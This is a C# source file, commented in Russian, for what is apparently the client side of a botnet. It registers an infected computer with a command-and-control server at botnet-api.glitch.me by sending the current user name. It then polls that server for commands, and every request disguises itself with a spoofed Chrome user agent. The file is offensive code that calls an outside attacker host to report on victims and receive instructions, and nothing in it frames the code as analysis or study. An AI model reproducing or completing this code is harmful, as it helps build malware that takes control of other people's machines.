using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net.Http;
using System.Web.Script.Serialization;

namespace CommandsLibrary
{
    public class Client
    {
        public uint id { get; set; }
        public string nameofpc { get; set; }
    }
    public class HttpCommands
    {
        public static async Task<T> getCommandAssync<T>(int idofpc, int idofcommand) //Получает комманду в соответствии с заданным id ПК и id комманды
        {
            HttpClient client = new HttpClient();
            client.DefaultRequestHeaders.UserAgent.ParseAdd("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36");
            client.BaseAddress = new Uri("http://botnet-api.glitch.me/");
            T command = default(T);
            HttpResponseMessage response = await client.GetAsync($"/api/messages/{idofpc}/{idofcommand}");//Получение комманды
            if (response.IsSuccessStatusCode)//Если комманда есть
            {
                return command = await response.Content.ReadAsAsync<T>();
            }
            else
            {
                return command;
            }
        }
        public static async Task<Int32> getCommandIdAsync(int idofpc)//определяет id комманды
        {
            HttpClient client = new HttpClient();
            client.DefaultRequestHeaders.UserAgent.ParseAdd("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36");
            client.BaseAddress = new Uri("http://botnet-api.glitch.me/");
            HttpResponseMessage message = await client.GetAsync($"/api/messages/{idofpc}");
            int id = 0;
            if (message.IsSuccessStatusCode)
            {
                return id = await message.Content.ReadAsAsync<int>();
            }
            else
            {
                return id;
            }
        }
        public static async Task<Int32> createUserNameAndGetIdAsync()//Отправляет на API Имя текущего компьютера и получает уникальный Id
        {
            HttpClient client = new HttpClient();
            client.DefaultRequestHeaders.UserAgent.ParseAdd("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36");
            client.BaseAddress = new Uri("http://botnet-api.glitch.me/");
            Client name = new Client
            {
                nameofpc = Environment.UserName
            };
            string json = new JavaScriptSerializer().Serialize(name);
            HttpResponseMessage response = await client.PostAsync("/api/client", new StringContent(json, Encoding.UTF8, "application/json"));
            int id = await response.Content.ReadAsAsync<Int32>();
            return id;
        }
    }
}
